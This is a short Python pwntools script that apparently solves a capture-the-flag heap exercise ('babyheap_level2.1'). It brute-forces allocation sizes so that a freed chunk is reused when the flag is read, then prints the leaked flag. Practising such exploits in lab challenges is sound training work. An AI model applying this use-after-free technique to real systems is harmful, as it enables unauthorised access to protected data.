from pwn import *
BINARY = "/challenge/babyheap_level2.1"
i = 0
while True:
    
    p = process(BINARY)

    p.sendline(b'malloc')
    p.sendline(str(8 * (2**i)).encode())
    i+=1
    p.sendline(b'free')
    p.sendline(b'read_flag')
    p.sendline(b'puts')
    p.sendline(b'quit')
    a = p.recv()
    p.close()
    if b"pwn" in a:
        break

print(a.decode())